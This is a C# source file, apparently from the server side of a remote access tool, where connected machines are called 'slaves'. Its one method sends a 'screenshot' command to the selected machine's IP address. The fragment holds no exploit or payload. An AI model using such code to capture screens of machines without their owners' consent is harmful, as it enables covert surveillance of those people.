using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows;

namespace SOURIS_Server.Slaves
{
    class SlaveFunc
    {
        public static void Screenshot()
        {
            try
            {
                int selected = MainWindow.main.listView1.SelectedIndex;
                Form.FormUpdate.addlistbox("Trying to Screenshot :" + SlaveList.List[selected].IP);
                Sockets.ClientOrder.StartClient("screenshot", SlaveList.List[selected].IP);
            }
            catch
            {

            }
        }
    }
}
